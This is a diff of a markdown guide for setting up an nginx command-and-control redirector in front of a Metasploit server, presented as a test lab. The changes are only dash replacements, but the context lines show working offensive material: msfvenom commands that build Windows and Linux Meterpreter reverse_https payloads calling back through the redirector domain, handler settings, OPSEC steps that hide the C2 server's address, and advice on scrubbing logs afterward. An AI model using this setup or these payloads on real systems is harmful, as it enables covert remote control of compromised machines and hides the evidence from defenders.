@@ -1,4 +1,4 @@
-# Nginx C2 Redirector — Full Testlab Setup Guide
+# Nginx C2 Redirector - Full Testlab Setup Guide
 
 Everything documented here reflects the actual steps, errors, and fixes encountered during a live deployment. Commands are exact and in order.
 
@@ -37,9 +37,9 @@ Both servers were VPS instances on the same provider. The VirtualBox VM was on a
 
 ---
 
-## Part 1 — DNS
+## Part 1 - DNS
 
-Point the domain at the redirector **before doing anything else**. Let's Encrypt verifies ownership over HTTP before issuing a cert — if DNS isn't right, certbot fails.
+Point the domain at the redirector **before doing anything else**. Let's Encrypt verifies ownership over HTTP before issuing a cert - if DNS isn't right, certbot fails.
 
 In your DNS panel, create:
 
@@ -58,7 +58,7 @@ dig +short 435pau.com
 
 ---
 
-## Part 2 — Firewall Rules
+## Part 2 - Firewall Rules
 
 ### Redirector (38.55.155.155)
 
@@ -72,7 +72,7 @@ ufw status
 
 ### MSF Server (40.33.133.133)
 
-Port 4444 must only accept connections from the redirector — never from the open internet.
+Port 4444 must only accept connections from the redirector - never from the open internet.
 
 ```bash
 ufw allow 22/tcp
@@ -92,7 +92,7 @@ Verify the rule is in the right order (allow before deny):
 
 ---
 
-## Part 3 — Deploy RedirectorOfFun on the Redirector
+## Part 3 - Deploy RedirectorOfFun on the Redirector
 
 ### 3.1 Transfer the project
 
@@ -160,7 +160,7 @@ systemctl status nginx
 # Active: active (running)
 
 curl -sk -o /dev/null -w "%{http_code}\n" https://435pau.com/
-# 200 (decoy page) or 502 (MSF not listening yet — both mean nginx is working)
+# 200 (decoy page) or 502 (MSF not listening yet - both mean nginx is working)
 
 openssl s_client -connect 435pau.com:443 -servername 435pau.com </dev/null 2>/dev/null \
   | openssl x509 -noout -issuer -dates
@@ -170,7 +170,7 @@ openssl s_client -connect 435pau.com:443 -servername 435pau.com </dev/null 2>/de
 
 ---
 
-## Part 4 — Errors Encountered During Deployment
+## Part 4 - Errors Encountered During Deployment
 
 These are the actual errors hit during testing, in the order they appeared.
 
@@ -230,7 +230,7 @@ Job for nginx.service failed
 2. Queries real DNS via Google DNS-over-HTTPS (`dns.google/resolve`) which bypasses `/etc/hosts` entirely.
 3. Falls back to `dig @8.8.8.8` if curl fails.
 
-The domain is no longer written to `/etc/hosts` at all — it served no purpose and only caused problems.
+The domain is no longer written to `/etc/hosts` at all - it served no purpose and only caused problems.
 
 ### Error 5: DNS pointing at MSF server
 
@@ -260,7 +260,7 @@ sudo: unable to resolve host renjxkwf: Name or service not known
 [-] Meterpreter session 1 is not valid and will be closed
 ```
 
-**Cause:** Protocol mismatch. The handler was `reverse_http`, which means MSF expects plain HTTP on port 4444. But the payload connected to `435pau.com:443` (HTTPS), nginx forwarded it to `40.33.133.133:4444` as plain HTTP, and MSF sent back the stage. The stage then embedded `435pau.com:443` as its callback URL and tried to reconnect — using HTTP. nginx on port 443 only speaks TLS and rejected the plain HTTP connection.
+**Cause:** Protocol mismatch. The handler was `reverse_http`, which means MSF expects plain HTTP on port 4444. But the payload connected to `435pau.com:443` (HTTPS), nginx forwarded it to `40.33.133.133:4444` as plain HTTP, and MSF sent back the stage. The stage then embedded `435pau.com:443` as its callback URL and tried to reconnect - using HTTP. nginx on port 443 only speaks TLS and rejected the plain HTTP connection.
 
 **Fix:** Two changes required:
 
@@ -271,7 +271,7 @@ Both are covered in Part 5.
 
 ---
 
-## Part 5 — MSF Server Setup
+## Part 5 - MSF Server Setup
 
 ### 5.1 Add the redirector domain to /etc/hosts on the MSF server
 
@@ -340,9 +340,9 @@ ss -tlnp | grep 4444
 
 ---
 
-## Part 6 — Generate Payloads
+## Part 6 - Generate Payloads
 
-Run on the MSF server. Payloads connect to the redirector domain — they should never reference the MSF server IP directly.
+Run on the MSF server. Payloads connect to the redirector domain - they should never reference the MSF server IP directly.
 
 ### Windows (staged, recommended)
 
@@ -359,7 +359,7 @@ msfvenom \
 
 ```bash
 # Note: linux/x64/meterpreter/reverse_https (with slash) is INVALID
-# Linux Meterpreter over HTTPS is stageless only — use underscore not slash
+# Linux Meterpreter over HTTPS is stageless only - use underscore not slash
 
 msfvenom \
   -p linux/x64/meterpreter_reverse_https \
@@ -379,7 +379,7 @@ scp root@40.33.133.133:/tmp/payload.elf ./
 
 ---
 
-## Part 7 — VirtualBox Test Agent
+## Part 7 - VirtualBox Test Agent
 
 ### Requirements
 
@@ -419,11 +419,11 @@ chmod +x payload.elf
 
 ---
 
-## Part 8 — Verifying the Chain
+## Part 8 - Verifying the Chain
 
 Open three terminals before running the payload to watch traffic at each hop in real time.
 
-### Terminal 1 — Redirector access log
+### Terminal 1 - Redirector access log
 
 ```bash
 # On 38.55.155.155
@@ -437,17 +437,17 @@ Expected output when the agent connects:
 <agent_ip> - - [15/Jun/2026:12:00:01] "POST /Khv1Jx HTTP/1.1" 200 48 "-" "Mozilla/5.0..."
 ```
 
-### Terminal 2 — Connections at each leg
+### Terminal 2 - Connections at each leg
 
 ```bash
-# On the redirector — shows both legs of the proxy simultaneously
+# On the redirector - shows both legs of the proxy simultaneously
 watch -n1 'echo "=== Inbound (agent → nginx) ===" && \
   netstat -an | grep ":443" | grep ESTABLISHED && \
   echo "=== Outbound (nginx → MSF) ===" && \
   netstat -an | grep ":4444" | grep ESTABLISHED'
 ```
 
-### Terminal 3 — MSF console
+### Terminal 3 - MSF console
 
 ```
 [*] https://0.0.0.0:4444 handling request from 38.55.155.155
@@ -460,7 +460,7 @@ meterpreter > getuid
 meterpreter > ipconfig
 ```
 
-### OPSEC verification — confirm MSF IP is not visible to the agent
+### OPSEC verification - confirm MSF IP is not visible to the agent
 
 **On the VirtualBox VM (Windows):**
 
@@ -468,9 +468,9 @@ meterpreter > ipconfig
 netstat -an | findstr ESTABLISHED
 ```
 
-You should see connections to `38.55.155.155:443` only. If you see `40.33.133.133` anywhere, the payload is bypassing the redirector — check the Override settings in the handler.
+You should see connections to `38.55.155.155:443` only. If you see `40.33.133.133` anywhere, the payload is bypassing the redirector - check the Override settings in the handler.
 
-**On the MSF server — confirm traffic comes from the redirector, not directly from the agent:**
+**On the MSF server - confirm traffic comes from the redirector, not directly from the agent:**
 
 ```bash
 tcpdump -i any -n port 4444 -A 2>/dev/null | grep "Host:"
@@ -480,7 +480,7 @@ tcpdump -i any -n port 4444 -A 2>/dev/null | grep "Host:"
 
 ---
 
-## Part 9 — Full Connection Flow (HTTPS end-to-end)
+## Part 9 - Full Connection Flow (HTTPS end-to-end)
 
 ```
 VirtualBox                  435pau.com:443             MSF:4444
@@ -508,7 +508,7 @@ Every hop is encrypted. The MSF server is never referenced in any traffic the ag
 
 ---
 
-## Part 10 — Operational Notes
+## Part 10 - Operational Notes
 
 ### Check redirector status
 
@@ -540,7 +540,7 @@ cd /root/RedirectorOfFun
 bash blocklist-update.sh
 ```
 
-Or via the menu: `Update Blocklist` — reloads nginx automatically after updating.
+Or via the menu: `Update Blocklist` - reloads nginx automatically after updating.
 
 ### Scrub logs before leaving
 
@@ -575,7 +575,7 @@ cat /var/log/nginx/access.log    # Should be empty
 
 ---
 
-## Part 11 — Certificate Renewal
+## Part 11 - Certificate Renewal
 
 The cron job in `/etc/cron.d/nysm` handles renewal automatically:
 
@@ -586,13 +586,13 @@ The cron job in `/etc/cron.d/nysm` handles renewal automatically:
   && nginx -t 2>/dev/null \
   && systemctl reload nginx
 
-# Daily expiry alert at 08:00 — logs a warning if cert expires within 14 days
+# Daily expiry alert at 08:00 - logs a warning if cert expires within 14 days
 0 8 * * * root for cert in /etc/letsencrypt/live/*/cert.pem; do ...
 ```
 
 Key behaviours:
-- `nginx -t` runs before reload — a broken config won't take down the redirector
-- `systemctl reload` (graceful) instead of restart — active sessions aren't dropped
+- `nginx -t` runs before reload - a broken config won't take down the redirector
+- `systemctl reload` (graceful) instead of restart - active sessions aren't dropped
 - Certbot's own systemd timer (`certbot.timer`) is disabled by the installer to avoid double renewal
 
 Manual renewal test:
@@ -603,12 +603,12 @@ certbot renew --dry-run
 
 ---
 
-## Part 12 — Troubleshooting Reference
+## Part 12 - Troubleshooting Reference
 
 | Symptom | Likely cause | Fix |
 |---|---|---|
 | `bind() to 0.0.0.0:80 failed (98)` | Something else on port 80 | `ss -tlnp \| grep :80`, kill the process |
-| certbot: `Connection refused` on ACME challenge | DNS points to wrong IP | Check `dig +short 435pau.com` — must return redirector IP |
+| certbot: `Connection refused` on ACME challenge | DNS points to wrong IP | Check `dig +short 435pau.com` - must return redirector IP |
 | certbot: `Connection refused` even with correct DNS | nginx not running when certbot fires | `systemctl start nginx` then re-run certbot |
 | `conflicting server name ... ignored`, nginx won't start | Double SSL server block | Used `certbot --nginx` which modified config; switch to `certbot certonly --webroot` |
 | `verify_dns` shows `127.0.0.1` | Stale `/etc/hosts` entry from previous run | `sed -i '/435pau.com/d' /etc/hosts` |
@@ -622,7 +622,7 @@ certbot renew --dry-run
 
 ---
 
-## Appendix — nginx Config After Full Setup
+## Appendix - nginx Config After Full Setup
 
 After the installer completes, `/etc/nginx/sites-enabled/default` looks like this:
 
@@ -668,7 +668,7 @@ server {
 
 ---
 
-## Appendix — MSF Handler Quick Reference
+## Appendix - MSF Handler Quick Reference
 
 ```
 use exploit/multi/handler
@@ -687,7 +687,7 @@ run -j
 msfvenom -p windows/x64/meterpreter/reverse_https \
   LHOST=435pau.com LPORT=443 -f exe -o /tmp/payload.exe
 
-# Linux payload (stageless only — slash variant doesn't exist)
+# Linux payload (stageless only - slash variant doesn't exist)
 msfvenom -p linux/x64/meterpreter_reverse_https \
   LHOST=435pau.com LPORT=443 -f elf -o /tmp/payload.elf
 ```
